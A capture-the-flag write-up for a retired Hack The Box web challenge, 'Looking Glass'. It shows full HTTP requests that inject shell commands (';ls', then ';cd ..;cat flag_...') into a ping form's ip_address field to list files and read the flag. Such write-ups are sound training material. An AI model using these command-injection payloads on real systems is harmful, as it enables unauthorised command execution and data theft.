# Solution for Looking Glass HTB Challenges Web Retired

The title of the page is RCE and exploiting is really simple
We see from the request there are 2 parameters
```text
POST / HTTP/1.1
Host: 142.93.40.197:30748
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://142.93.40.197:30748
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://142.93.40.197:30748/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

test=ping&ip_address=10.10.10.10&submit=Test
```

So there are 2 injectable parameters
We aren't getting anything if we inject something in the test parameter but we can inject stuff into the ip_address parameter and get command injection
Lets test it out

```text
POST / HTTP/1.1
Host: 142.93.40.197:30748
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://142.93.40.197:30748
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://142.93.40.197:30748/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

test=ping&ip_address=;ls&submit=Test
```
Response:
```text
<textarea contentEditable="true" class="form-control mt-2 disabled" style="resize:none;height:300px;" readonly>index.php
</textarea>
```
Now, after playing around, 
The final payload is 
```request
POST / HTTP/1.1
Host: 142.93.40.197:30748
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://142.93.40.197:30748
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://142.93.40.197:30748/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

test=ping&ip_address=;cd ..;cat flag_mHCfT&submit=Test
```